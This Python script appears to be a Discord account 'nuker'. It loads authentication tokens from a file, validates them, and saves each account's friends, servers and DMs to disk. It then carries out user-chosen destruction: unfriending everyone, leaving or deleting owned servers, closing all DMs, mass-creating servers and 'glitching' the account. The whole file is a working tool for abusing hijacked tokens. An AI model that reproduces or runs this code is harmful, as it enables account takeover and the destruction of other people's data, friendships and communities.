import os, time, requests, colorama, sys, ctypes, threading, json, datetime
from src import repo
from colorama import Fore
colorama.init()
pool = repo.Sipher(800)
xd = threading.Semaphore(value=1)
if not os.path.exists("data"):
    os.mkdir("data")
os_info = f"{Fore.CYAN}kaito@{repo.stable()}~${Fore.RESET} "
while True:
    data = {}
    data["1"] = "Remove Friends"
    data["2"] = "Leave Servers"
    data["3"] = "Close All DMS"
    data["4"] = "Create Max Servers"
    data["5"] = "Glitch Display"
    valid = []
    tokens = open("tokens.txt","r").read().splitlines()
    date = f"data/{datetime.datetime.now().strftime('%Y-%m-%d %H.%M.%S')}"
    if not os.path.exists(date):
        os.mkdir(date)
    repo.title("Loading Tokens...")
    repo.multi_clearer()
    if len(tokens) < 1:
        repo.date_send("There are no tokens in the file... please get some like tf?")
        sys.exit()
    else:
        pass
    repo.multi_clearer()
    repo.ui(tokens)
    repo.title("Checking tokens...")
    for token in tokens:
        pool.add_task(repo.token_checker, token, valid, xd)
        pool.wait_completion()
    if not len(valid) == 0:
        repo.date_send(f"Storing valid tokens now...")
        open(f"{date}/valid_tokens.txt","w+").write("\n".join(valid))
    else:
        repo.date_send(f"No tokens were valid, exiting now...")
        sys.exit()
    time.sleep(3)
    repo.multi_clearer()
    repo.ui(valid)
    repo.title("Storing tokens information for future use...")
    for token in valid:
        pool.add_task(repo.collection, token, data, xd)
        pool.wait_completion()
    open(f"{date}/data.json","w+").write(json.dumps(data,indent=4,sort_keys=True))
    time.sleep(3)
    repo.multi_clearer()
    repo.ui(valid)
    repo.title("Loaded Options")
    print(Fore.LIGHTYELLOW_EX + f"""
[{Fore.RED}N/A{Fore.RESET}]{Fore.YELLOW}Here are your options:{Fore.RESET}
----------------------------------
{Fore.BLUE}|[1] Remove Friends 
|[2] Leave Servers
|[3] Close All DMS
|[4] Create Max Servers
|[5] Glitch Display {Fore.RESET}
----------------------------------
Put the numbers in order on how you want to nuke the account (You don't have to include all the numbers):
""")
    order = input(os_info)
    for mode in order.split():
        repo.multi_clearer()
        repo.ui(valid)
        repo.date_send(f"Current number being analysed: {mode}...")
        repo.date_send(f"Function Analysis: {data[mode]}")
        if mode == "1":
            for token in valid:
                amount = 0
                headers = {'Authorization' : token}
                for friend in data[token]['friends']:
                    repo.title(f"Removing friends for {data[token]['info']['username']}... || {amount}/{len(data[token]['friends'])}")
                    pool.add_task(repo.remove_friend,friend['id'],headers)
                    amount += 1
        if mode == "2":
            for token in valid:
                amount = 0
                headers = {'Authorization' : token}
                for server in data[token]['servers']:
                    repo.title(f"Leaving servers for {data[token]['info']['username']}... || {amount}/{len(data[token]['servers'])}")
                    if server['owner']:
                        pool.add_task(repo.delete_guild,headers,server['id'])
                        time.sleep(0.01)
                    else:
                        pool.add_task(repo.leave_guild,headers, server['id']) 
                        time.sleep(0.01)
                    amount += 1
        if mode == "3":
            for token in valid:
                amount = 0
                headers = {'Authorization' : token}
                for channel in data[token]['dm_channels']:
                    repo.title(f"Closing all DMS for {data[token]['info']['username']}... || {amount}/{len(data[token]['dm_channels'])}")
                    pool.add_task(repo.close,channel['id'],headers)
                    amount += 1
        if mode == "4":
            for token in valid:
                repo.date_send(f"What would you like to name the servers for {data[token]['info']['username']}?")
                name = input(os_info)
                amount = 0
                headers = {'Authorization' : token}
                if "2" in order.split():
                    count = 100
                else:
                    count = 100 - len(data[token]['servers'])
                for x in range(count):
                    repo.title(f"Creating max servers for {data[token]['info']['username']}... || {amount}/{count}")
                    pool.add_task(repo.create_guild,name,headers)
                    amount += 1
        if mode == "5":
            amount = 0
            repo.title(f"Glitching all tokens... || {amount}/{len(valid)}")
            for token in valid:
                repo.date_send(f"glitched token {token}")
                pool.add_task(repo.glitch,headers)
                amount += 1
    pool.wait_completion()
    repo.multi_clearer()
    repo.ui(valid)
    repo.date_send(f"Do you want to exit? (Y/N)")
    choice = input(os_info)
    if choice in "YES Yes Y yes Yh yh yea".split():
        sys.exit()
    else:
        repo.date_send(f"Returning to main menu...")
        time.sleep(2)


    
